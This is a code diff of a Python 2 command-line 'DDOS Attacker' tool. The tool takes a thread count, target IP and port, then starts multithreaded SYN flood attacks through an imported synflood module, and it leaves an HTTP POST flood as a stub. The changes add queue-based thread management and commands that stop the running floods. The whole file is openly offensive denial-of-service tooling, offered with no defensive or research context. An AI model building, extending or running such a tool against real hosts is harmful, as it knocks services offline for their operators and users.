@@ -1,5 +1,6 @@
 import threading
 import socket
+import Queue
 from synflood import *
 
 def getArgs(words):
@@ -15,20 +16,26 @@ def getArgs(words):
     return (words[iN], words[iPort], words[iIP])
 
 def startSynFlood((nThreads, portDest, ipDest), synEvent):
+    synQueue = Queue.Queue(nThreads)
+
     for i in range(1, int(nThreads)):
         t = threading.Thread(target = synFlood, \
-                             args = (i, portDest, ipDest, synEvent))
+                             args = (i, portDest, ipDest, synEvent, synQueue))
+        t.setDaemon(True)
         t.start()
+        synQueue.put(i)
     print ">>> %s threads are attacking using SYN Flood." % (i)
+    return synQueue
 
 # TODO: startHttpPost
 
-synEvent = threading.Event()
-httpEvent = threading.Event()
-
-def init_screen():
+def handleInput():
     print "===== Welcome to DDOS Attacker====="
     print "Please command your attack or try --help for more information"
+
+    synEvent = threading.Event()
+    httpEvent = threading.Event()
+    httpQueue = Queue.Queue()
 
     while 1:
         line = raw_input("> ")
@@ -70,16 +77,19 @@ def init_screen():
                 args = getArgs(words)
                 if 'syn-flood' in words:
                     synEvent.set()
-                    startSynFlood(args, synEvent)
+                    synQueue = startSynFlood(args, synEvent)
             except ValueError:
                 print "Invalid compulsory flag(s)"
                 continue
         elif '-stop' in words:
-            # TODO: dar join nas threads que morreram PARA CEIFAR OS ZUMBIS
-            if 'syn-flood' in words:
-                synEvent.clear();
+            if ('syn-flood' in words) & (synEvent.is_set()):
+                synEvent.clear()
+                synQueue.join()
+                print "SYN Flood attack stopped"
             else:
-                httpEvent.clear();
+                httpEvent.clear()
+                httpQueue.join()
+                print "HTTP Post attack stopped"
         elif '-time' in words:
             i = words.index('-time')
             try:
@@ -90,4 +100,5 @@ def init_screen():
             print "Missing necessary flag. For more information, try --help"
 
 if __name__ == '__main__':
-    init_screen()
+    handleInput()
+
